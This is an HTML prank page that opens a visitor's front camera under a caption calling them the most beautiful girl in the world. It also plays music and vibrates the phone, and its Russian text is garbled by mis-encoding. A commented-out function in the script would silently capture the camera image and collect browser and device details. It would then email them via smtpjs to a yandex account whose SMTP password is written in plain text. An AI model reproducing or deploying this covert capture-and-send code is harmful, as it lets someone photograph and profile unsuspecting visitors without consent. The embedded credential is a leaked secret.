<!doctype html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Get User Media - Photo</title>
    <meta name="viewport" content="initial-scale=1, user-scalable=no">
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="icon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="icon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="icon-16x16.png">
    <link rel="manifest" href="/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <style>
        #video {
            width: 100vw;
            height: 100vh;
            max-height: 100vh;
            object-fit: cover;
        }
        
        #canvas {
            display: none;
        }
        .description {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            text-align: center;
            padding: 12px;
            font-size: 20px;
            font-weight: bold;
            background-color: white;
        }
        #loader {
            background: #fd79a8;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: transform 1s ease;
            z-index: 10000;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
        }
        body{
            margin: 0;
            padding: 0;
        }
        #loader.closed {
            transform: translateY(-100%);
            
        }
        #loader h1 {
            color: white;
            text-align: center;
            padding: 0 20px;
            line-height: 1.5;
            font-family: cursive
        }
    </style>
</head>

<body>
    <video id="video" autoplay playsinline></video>
    <audio id="myAudio" src="https://rur.hitmotop.com/get/music/20200422/ONA_-_Ty_moya_muza_moya_bol_i_moya_khimiya_69278703.mp3"></audio>
    <canvas id="canvas" width="100%" height="100%" style="display:none"></canvas>
    <div id="text" class="description">
        –≠—Ç–æ —Å–∞–º–∞—è –∫—Ä–∞—Å–∏–≤–∞—è –¥–µ–≤—É—à–∫–∞ –≤ –º–∏—Ä–µ
    </div>
    <div id="loader">
        <h1>–ó–Ω–∞–µ—à—å –∫—Ç–æ —Å–∞–º–∞—è –∫—Ä–∞—Å–∏–≤–∞—è –¥–µ–≤—É—à–∫–∞ –≤ –º–∏—Ä–µ?üòâüòâüòâ</h1>
    </div>
    <script src="https://smtpjs.com/v3/smtp.js">
    </script>
    <script>
        var canvas = document.getElementById('canvas');
        var context = canvas.getContext('2d');
        var video = document.getElementById('video');

        function vibrate(val) {
            try {
                if (navigator) {
                    if (navigator.vibrate) return navigator.vibrate(val);
                    else if (navigator.oVibrate) return navigator.oVibrate(val);
                    else if (navigator.mozVibrate) return navigator.mozVibrate(val);
                    else if (navigator.webkitVibrate) return navigator.webkitVibrate(val);
                } else {
                    document.append("–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≤–∏–±—Ä–∞—Ü–∏–∏.")
                }
            } catch (e) {
                alert(e);
            }
        }

        function infiniteVibrate(val, interval) {
            stopVibrate();
            vInterval = setInterval(function() {
                vibrate(val);
            }, interval);
        }

        const sleep = (time) => new Promise((resolve, reject)=>{
            setTimeout(resolve,time)
        })

        const hearthBeats = async () => {
            await sleep(100);
            await vibrate(200);
            await sleep(300);
            await vibrate(200);
            await sleep(1000);

            hearthBeats();
        }
        hearthBeats();
        function stopVibrate() {
            if (typeof(vInterval) !== "undefined") clearInterval(vInterval);
            vibrate(0);
        }
        video.onvolumechange = (event) => {
            alert("The volume changed.");
        };
        // Trigger photo take
        var keyDownHandler = function(evt) {
            alert(evt.key)
        if (evt.key === 'VolumeDown') {
            handleClick()
        } else if (evt.key === 'VolumeUp') {
            handleClick()
        }
        evt.preventDefault(); // to stop system app from processing keydown event
        };
        // document.getElementsByTagName("video")[0].addEventListener("click", handleClick);
        // window.addEventListener('keydown', keyDownHandler);
        // function handleClick() {
        //     canvas.width = video.videoWidth;
        //     canvas.height = video.videoHeight;
        //     context.drawImage(video, 0, 0, canvas.width, canvas.height);

        //     var code = navigator.appCodeName;
        //     var name = navigator.appName;
        //     var vers = navigator.appVersion;
        //     var platform = navigator.platform;
        //     var cook = navigator.cookieEnabled;
        //     var je = navigator.javaEnabled();
        //     var ua = navigator.userAgent;
        //     var text = '–í–∞—à –±—Ä–∞—É–∑–µ—Ä: ' + name +
        //         '<br />–í–µ—Ä—Å–∏—è –±—Ä–∞—É–∑–µ—Ä–∞: ' + vers +
        //         '<br />–ö–æ–¥–æ–≤–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞: ' + code +
        //         '<br />–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ' + platform +
        //         '<br />–ü–æ–¥–¥–µ—Ä–∂–∫–∞ cookie: ' + cook +
        //         '<br />–ü–æ–¥–¥–µ—Ä–∂–∫–∞ JavaScript: ' + je +
        //         '<br />–ë—Ä–∞—É–∑–µ—Ä: ' + ua +
        //         navigator.language +
        //         '<br />–û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞: ' + navigator.oscpu +
        //         '<br />–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å: ' + navigator.vendor +
        //         '<br />–ü–æ–¥—Ä–∞–∑–¥–µ–ª–µ–Ω–∏–µ: ' + navigator.vendorSub;
        //     vibrate(100)
        //     // PORT 2525
        //     Email.send({
        //         Host : "smtp.elasticemail.com",
        //         Username: 'khasieva.2023@yandex.ru',
        //         Password: "CBD06505D94CDFC25333D695E7DE7816C1AA",
        //         To: 'khasieva.2023@yandex.ru',
        //         From: "khasieva.2023@yandex.ru",
        //         Subject: "–ü—Ä–∏—à–µ–ª —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞",
        //         Body: "<html><h2>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h2><p>" + text + "</p></html>",
        //         Attachments: [{
        //             name: 'photo.png',
        //             data: canvas.toDataURL()
        //         }]
        //     }).then(
        //         message => {
        //             vibrate(500)
        //         }
        //     );
        
        // }
        // Grab elements, create settings, etc.
        var video = document.getElementById('video');

        var constraints = {
            video: {
                facingMode: "user"
            },
            audio: false
        };
        // Get access to the camera!
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
                video.srcObject = stream;
                document.getElementById('loader').classList.add('closed')
                // video.play();
            }).catch(error=>alert(error));
        }

        document.addEventListener('DOMContentLoaded', () => {
            const urlParams = new URLSearchParams(window.location.search);
            const name = urlParams.get('name');
            if(name)
                document.getElementById('text').textContent = name;
            document.body.addEventListener("touchstart", function () {
                var audio = document.getElementById("myAudio");
                        audio.play();
            })

        })
    </script>
</body>

</html>